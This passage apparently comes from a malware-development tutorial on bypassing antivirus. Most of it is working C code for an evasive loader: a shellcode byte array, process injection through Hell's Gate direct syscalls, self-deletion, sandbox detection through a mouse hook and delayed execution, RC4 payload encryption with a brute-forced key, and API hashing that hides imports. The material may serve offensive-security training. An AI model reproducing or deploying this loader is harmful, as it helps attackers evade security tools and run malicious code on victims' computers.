	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



int main() {
	
	DWORD		dwProcessId		= NULL;
	HANDLE		hProcess		= NULL;


	if (!InitializeSyscalls()) {
		printf("[!] Failed To Initialize Syscalls Structure \n");
		return -1;
	}


#ifdef TARGET_PROCESS

	wprintf(L"[i] Targetting Remote Process %s ... \n", TARGET_PROCESS);
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwProcessId, &amp;hProcess)) {
		printf("[!] Could Not Find Target Process Id \n");
		return -1;
	}
	printf("[+] Target Process Id Detected Of PID : %d \n", dwProcessId);

	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), FALSE)) {
		printf("[!] Failed To Inject Payload \n");
		return -1;
	}


#endif // TARGET_PROCESS



#ifndef TARGET_PROCESS

	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
		printf("[!] Failed To Inject Payload \n");
		return -1;
	}

#endif // !TARGET_POCESS


	return 0;
}

</code></pre>
<h3>Loader Results</h3>
<h4>Remote Code Injection</h4>
<p><img src="Bypassing%20AVs_files/av-bypass-216782299-f2e9c796-2d79-42e9-b69d-6e4277f531f4.png" alt="image">
<img src="Bypassing%20AVs_files/av-bypass-316782324-aafb32f5-4fec-40e0-bbb3-029ead10c99d.png" alt="image"></p>
<h4>Local Code Injection</h4>
<p><img src="Bypassing%20AVs_files/av-bypass-416782441-c87f902c-af70-4657-ad39-93d2f977673b.png" alt="image">
<img src="Bypassing%20AVs_files/av-bypass-516782392-ec8ace35-58fe-4ac6-8317-9d553123076b.png" alt="image"></p>
<h3>Anti-Analysis Features</h3>
<p>To add anti-analysis features create a new file called <code>AntiAnalysis.c</code>. This file will contain the following functionality:</p>
<ul>
<li>
<p>Self-deletion function from the <em>Anti-Debugging - Self-Deletion</em> module.</p>
</li>
<li>
<p>Mouse clicks monitoring feature from the <em>Anti-Virtual Environments - Multiple Techniques</em> module</p>
</li>
<li>
<p>A function to delay execution using <code>NtDelayExecution</code> from the <em>Anti-Virtual Environments - Multiple Delay Execution Techniques</em> module</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#include "Structs.h"
#include "Common.h"


// Global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;



// The callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}



BOOL MouseClicksLogger() {

    MSG 	Msg = { 0 };

    // Installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
    }

    // Process unhandled events
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


BOOL DeleteSelf() {


	WCHAR				    szPath[MAX_PATH * 2] 	    = { 0 };
	FILE_DISPOSITION_INFO	Delete 			    	    = { 0 };
	HANDLE				    hFile 			    	    = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename 		    	    = NULL;
	const wchar_t* 			NewStream 		    	    = (const wchar_t*)NEW_STREAM;
	SIZE_T				    sRename 		    	    = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

	//--------------------------------------------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename-&gt;FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

	//--------------------------------------------------------------------------------------------------------------------------

	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//--------------------------------------------------------------------------------------------------------------------------
	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------
	// DELEING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...");

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}



typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
	);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// Converting minutes to milliseconds
	DWORD                   dwMilliSeconds         = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval          = { 0 };
	LONGLONG                Delay                  = NULL;
	NTSTATUS                STATUS                 = NULL;
	fnNtDelayExecution      pNtDelayExecution      = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtDelayExecution");
	DWORD                   _T0                    = NULL,
	                        _T1                    = NULL;

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
		return FALSE;

	printf("\n\t&gt;&gt; _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	return TRUE;
}
</code></pre>
<h4>AntiAnalysis Helper Function</h4>
<p>Create a new function, <code>AntiAnalysis</code>, to efficiently call the above functions. To use the <code>AntiAnalysis</code> function, an external variable, <code>g_Sys</code>, is required. <code>g_Sys</code> is a <code>VX_TABLE</code> structure that contains the data necessary to use syscalls in the program.</p>
<p>Brief points about the <code>AntiAnalysis</code> function:</p>
<ul>
<li>
<p>It takes <code>dwMilliSeconds</code> as an input parameter which represents the amount of time to monitor for mouse clicks.</p>
</li>
<li>
<p>This function begins by calling <code>DeleteSelf</code> to delete the file from the disk.</p>
</li>
<li>
<p>A while loop is then initiated, which runs the <code>MouseClicksLogger</code> through a new thread and waits for it for a period specified by <code>dwMilliSeconds</code>.</p>
</li>
<li>
<p>Once the thread time is up, the hooks installed will be removed and 
the execution of the program will be delayed for half the value of the <code>i</code> variable; where <code>i</code> represent the value to delay execution for in minutes.</p>
</li>
<li>
<p>The function then checks the total number of mouse clicks before the 
delay. If it is less than 5, the global mouse click monitor variable, <code>g_dwMouseClicks</code>, is reset so the next loop will start the mouse click test from the beginning.</p>
</li>
<li>
<p>Incrementing the variable <code>i</code> forces the subsequent <code>DelayExecutionVia_NtDE</code> function to wait for a longer duration, creating a way of delaying execution in a sandbox.</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<pre><code>// using the 'extern' keyword, because this variable is already defined in the 'Inject.c' file
extern VX_TABLE g_Sys;

//...

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread			= NULL;
	NTSTATUS				STATUS			= NULL;
	LARGE_INTEGER			DelayInterval	= { 0 };
	FLOAT					i			    = 1;
	LONGLONG				Delay			= NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	// Self-deletion 
	if (!DeleteSelf()) {
		// we dont care for the result - but you can change this if you want
	}

	// Try 10 times, after that return FALSE
	while (i &lt;= 10) {


		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));

		// Creating a thread that runs 'MouseClicksLogger' function
		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
		if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
			printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}

		// Waiting for the thread for 'dwMilliSeconds'
		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
		if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 &amp;&amp; STATUS != STATUS_TIMEOUT) {
			printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}

		HellsGate(g_Sys.NtClose.wSystemCall);
		if ((STATUS = HellDescent(hThread)) != 0) {
			printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
			return FALSE;
		}

		// Unhooking 
		if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Delaying execution for specific amount of time
		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		// If the user clicked more than 5 times, we return true
		if (g_dwMouseClicks &gt; 5)
			return TRUE;

		// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
		g_dwMouseClicks = NULL;

		// Increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer
		i++;
	}

	return FALSE;
}
</code></pre>
<p><code>Common.h</code> must be updated to include the prototype for <code>AntiAnalysis</code> as well as defining <code>NEW_STREAM</code> which is required by the <code>DeleteSelf</code> function.</p>
<p><strong>Common.h</strong></p>
<pre><code>// The new data stream name
#define NEW_STREAM L":Maldev"

BOOL AntiAnalysis(DWORD dwMilliSeconds);
</code></pre>
<p>The anti-analysis features can be enabled by calling the <code>AntiAnalysis</code> function in <code>main.c</code>, however, this must be done after the <code>InitializeSyscalls</code> function has been called as the <code>AntiAnalysis</code>
 function utilizes direct syscalls which are only available after this 
function has been executed. For testing, the following if-statement is 
added to the main function in <code>main.c</code>.</p>
<p><strong>Main.c</strong></p>
<pre><code>if (!AntiAnalysis(20000)) {
	printf("[!] Detected A Virtualized Environment \n");
}
</code></pre>
<p>Where <code>20000</code> represents the time to monitor the mouse clicks in milliseconds.</p>
<h4>NtDelayExecution Via Hell's Gate</h4>
<p>Hell's Gate can be used to call <code>NtDelayExecution</code>, which requires updating the <code>VX_TABLE</code> structure definition located in <code>Common.h</code> and the <code>InitializeSyscalls</code> function to add the <code>VX_TABLE_ENTRY NtDelayExecution</code> element and initialize it. The <code>Hasher</code> program will also need to be used to calculate the hash for the syscall, as was done in previous steps.</p>
<h3>Anti-Analysis Results</h3>
<p>The following image shows the output of the <code>AntiAnalysis</code> function at runtime.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-616804411-39794aab-14d5-439c-9f30-2ed26efe8dce.png" alt="image"></p>
<h3>Payload Encryption</h3>
<p><code>HellShell.exe</code> will be used for payload encryption. The command that will be used is <code>.\HellShell.exe calc.bin rc4</code>, where <code>calc.bin</code> is the raw payload file. The encrypted payload will replace the previous unencrypted payload in the <code>main.c</code> file. Furthermore, the <code>Rc4EncryptionViSystemFunc032</code> function which is responsible for decryption will be saved in the <code>Inject.c</code> file.</p>
<h4>Brute Force Decryption</h4>
<p><code>HellShell.exe</code> generates the key below.</p>
<pre><code>unsigned char Rc4Key[] = {
        0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };
</code></pre>
<p>The key will be encrypted and then decrypted using the brute force 
method. First, the key needs to be encrypted. This will be done via a 
new project that will use the same algorithm as the <code>KeyGuard.exe</code> tool. The only difference is that the key is not randomly generated since <code>HellShell.exe</code> already generated one(<code>Rc4Key</code>). This new project is shared in this module's code and is named <code>KeyGuard2</code>.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-716812124-de717043-aa23-40c9-8058-f0ae0c06f407.png" alt="image"></p>
<p>The <code>Rc4EncryptionViSystemFunc032</code> function will be updated to include the brute forcing logic. The function will be called by <code>RemoteMappingInjectionViaSyscalls</code>.</p>
<pre><code>BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// The return of SystemFunction032
	NTSTATUS        	STATUS				= NULL;
	BYTE			RealKey	[KEY_SIZE]	= { 0 };
	int			    b				    = 0;

	// Brute forcing the key:
	while (1) {
		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		// Else, increment 'b' and try again
		else
			b++;
	}

	printf("[i] Calculated 'b' to be : 0x%0.2X \n", b);

	// Decrypting the key
	for (int i = 0; i &lt; KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
			        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// And using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// If SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Brute Force Decryption Results</h3>
<p>Executing the payload (Anti analysis features are disabled).</p>
<p><img src="Bypassing%20AVs_files/av-bypass-816812885-3a8e28cd-22cb-42f0-9673-9d58ea2471da.png" alt="image"></p>
<h3>API Hashing</h3>
<p>So far, all the WinAPIs used have been called directly, which means 
they can be found in the IAT of the implementation. To resolve this, a 
new file, <code>ApiHashing.c</code>, is created which contains the necessary functions for implementing API hashing.</p>
<p><strong>ApiHashing.c</strong></p>
<pre><code>#include &lt;Windows.h&gt;

#include "Structs.h"
#include "Common.h"

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER   ImgOptHdr        = pImgNtHdrs-&gt;OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir    = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	PDWORD			FunctionNameArray       = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
	PDWORD			FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
	PWORD			FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Hashing every function name `pFunctionName`
		// If both hashes are equal, then we found the function we want 
		if (dwApiNameHash == HASHA(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

			// Converting `FullDllName.Buffer` to upper case string 
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte-&gt;FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';

			// Hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
				return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);

		}
		else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}
</code></pre>
<h4>Header File</h4>
<p>Before continuing, a new header file, <code>typedef.h</code>, should be created to define the used WinAPIs as function pointers for clarity and maintainability. <code>Common.h</code> will need to include the <code>typedef.h</code> header file using <code>#include "typedef.h"</code>.</p>
<p><strong>typedef.h</strong></p>
<pre><code>#pragma once

#include &lt;Windows.h&gt;


typedef ULONGLONG(WINAPI* fnGetTickCount64)();

typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);

typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);

typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);

typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);
</code></pre>
<h4>API_HASHING Structure</h4>
<p>Next, a new structure <code>API_HASHING</code> is defined in <code>Common.h</code> and is used to store the addresses of WinAPIs used, making them more accessible for use within the implementation's functions.</p>
<p><strong>Common.h</strong></p>
<pre><code>typedef struct _API_HASHING {

	fnGetTickCount64                pGetTickCount64;
	fnOpenProcess                   pOpenProcess;
	fnCallNextHookEx                pCallNextHookEx;
	fnSetWindowsHookExW             pSetWindowsHookExW;
	fnGetMessageW                   pGetMessageW;
	fnDefWindowProcW                pDefWindowProcW;
	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
	fnGetModuleFileNameW            pGetModuleFileNameW;
	fnCreateFileW                   pCreateFileW;
	fnSetFileInformationByHandle    pSetFileInformationByHandle;
	fnCloseHandle                   pCloseHandle;

}API_HASHING, * PAPI_HASHING;
</code></pre>
<h4>Updating VX_Table</h4>
<p>The <code>GetModuleHandleH</code> and <code>GetProcAddressH</code> functions must be used to initialize the elements in the <code>API_HASHING</code> structure. The <code>InitializeSyscalls</code> function then uses these functions to initialize the <code>VX_TABLE</code> structure, which is used to call syscalls.</p>
<pre><code>// ...

API_HASHING g_Api = {0};


BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash                  = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

	// Initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtDelayExecution))
		return FALSE;


	//	User32.dll exported
	g_Api.pCallNextHookEx      = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW      = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW         = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW   = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	g_Api.pGetModuleFileNameW          = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle                 = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
	g_Api.pCreateFileW                 = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64              = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess                 = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle  = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}
</code></pre>
<p>The WinAPIs hashes are generated by the <code>Hasher</code> project as shown below.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-916815114-a9254939-9382-4dfe-8c32-54f871d9fc47.png" alt="image"></p>
<p>The next step is to utilize the <code>g_Api</code> structure to call all WinAPIs, by prefixing each one with <code>g_Api.&lt;WinAPI&gt;</code>, for example, <code>OpenProcess</code> should be called as <code>g_Api.pOpenProcess</code>.</p>
<h3>SystemFunction032 API Hashing Error</h3>
<p>While applying API hashing to the <code>SystemFunction032</code> function (that is not included in the <code>g_Api</code> structure) the following exception will occur.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-10.png" alt="image"></p>
<p>An exception is thrown when attempting to execute <code>SystemFunction032</code> at address <code>0x00007FFC42C09FF2</code>, which appears to be a valid address since it's being fetched using the line of code below.</p>
<pre><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Advapi32"), SystemFunction032_JOAA);
</code></pre>
<p>Use xdbg to check the address to understand the root of the problem.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-11.png" alt="image"></p>
